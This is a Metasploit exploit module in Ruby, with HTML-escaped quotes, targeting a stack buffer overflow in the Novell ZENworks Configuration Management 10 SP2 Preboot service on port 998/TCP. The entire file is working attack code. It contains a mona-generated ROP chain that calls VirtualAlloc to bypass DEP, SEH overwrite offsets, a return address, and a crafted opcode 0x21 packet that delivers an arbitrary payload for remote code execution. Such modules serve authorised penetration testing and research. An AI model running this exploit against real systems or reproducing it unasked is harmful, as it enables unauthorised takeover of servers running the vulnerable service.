# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::Tcp
    include Msf::Exploit::Remote::Seh
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Novell ZENworks Configuration Management Preboot Service 0x21 Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a remote buffer overflow in the ZENworks Configuration
                Management 10 SP2. The vulnerability exists in the Preboot service and can be
                triggered by sending a specially crafted packet with the opcode 0x21
                (PROXY_CMD_FTP_FILE) to port 998/TCP. The module has been successfully tested on
                Novell ZENworks Configuration Management 10 SP2 and Windows Server 2003 SP2
                (DEP bypass).
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;Stephen Fewer&#039;, # Vulnerability Discovery
                    &#039;juan&#039; # Metasploit module
                ],
            &#039;References&#039;     =>
                [
                    [ &#039;OSVDB&#039;, &#039;65361&#039; ],
                    [ &#039;BID&#039;, &#039;40486&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.zerodayinitiative.com/advisories/ZDI-10-090/&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.novell.com/support/kb/doc.php?id=7005572&#039; ]
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;
                },
            &#039;Payload&#039;        =>
                {
                    &#039;BadChars&#039; => "",
                    &#039;Space&#039;=> 8138,
                    &#039;DisableNops&#039; => true,
                    &#039;PrependEncoder&#039; => "\x81\xC4\x54\xF2\xFF\xFF" # add esp, -3500
                },
            &#039;Platform&#039;       => [&#039;win&#039;],
            &#039;Targets&#039;        =>
                [
                    [ &#039;Novell ZENworks Configuration Management 10 SP2 / Windows 2003 SP2&#039;,
                        {
                            &#039;Offset&#039;            => 8252,
                            &#039;OffsetBottomStack&#039; => 8288,
                            &#039;OffsetRop&#039;         => 44,
                            &#039;Ret&#039;               => 0x0040175a # add esp, 0x408 # ret - novell_pbserv.exe
                        }
                    ]
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => &#039;Mar 30 2010&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
        register_options([Opt::RPORT(998)], self.class)
    end
 
    def junk(n=4)
        return rand_text_alpha(n).unpack("V").first
    end
 
    def nop
        return make_nops(4).unpack("L")[0].to_i
    end
 
    # rop chain generated with mona.py
    def create_rop_chain()
        rop_gadgets =
            [
                0x100065d1, # POP EDX # MOV ESI,C4830005 # ADD AL,3B # RETN [zenimgweb.dll]
                0x00001000, # 0x00001000-> edx
                0x10062113, # POP ECX # RETN [zenimgweb.dll]
                0x1007d158, # ptr to &VirtualAlloc() [IAT zenimgweb.dll]
                0x10018553, # MOV EAX,DWORD PTR DS:[ECX] # ADD ESP,20 # RETN [zenimgweb.dll]
                junk,       # Filler (compensate)
                junk,       # Filler (compensate)
                junk,       # Filler (compensate)
                junk,       # Filler (compensate)
                junk,       # Filler (compensate)
                junk,       # Filler (compensate)
                junk,       # Filler (compensate)
                junk,       # Filler (compensate)
                0x10016818, # PUSH EAX # POP ESI # RETN [zenimgweb.dll]
                0x1002fd05, # POP EBP # RETN [zenimgweb.dll]
                0x10043053, # & push esp #  ret  [zenimgweb.dll]
                0x1003cbf8, # POP EBX # RETN [zenimgweb.dll]
                0x00000001, # 0x00000001-> ebx
                0x00423eeb, # POP ECX # RETN [novell-pbserv.exe]
                0x00000040, # 0x00000040-> ecx
                0x1003173e, # POP EDI # RETN [zenimgweb.dll]
                0x10020801, # RETN (ROP NOP) [zenimgweb.dll]
                0x00406b58, # POP EAX # RETN [novell-pbserv.exe]
                nop,
                0x1006d1e6, # PUSHAD # RETN [zenimgweb.dll]
        ].pack("V*")
 
        return rop_gadgets
    end
 
 
    def exploit
        connect
 
        buf = rand_text(target[&#039;OffsetRop&#039;])
        buf << create_rop_chain
        buf << payload.encoded
        buf << rand_text(target[&#039;Offset&#039;] - buf.length)
        buf << generate_seh_record(target.ret)
        buf << rand_text(target[&#039;OffsetBottomStack&#039;] - buf.length)
 
        packet =  [0x21].pack("N") # Opcode 0x21 PROXY_CMD_FTP_FILE
        packet << [buf.length].pack("N") # Length
        packet << buf # Value
        sock.put(packet)
 
        disconnect
    end
end



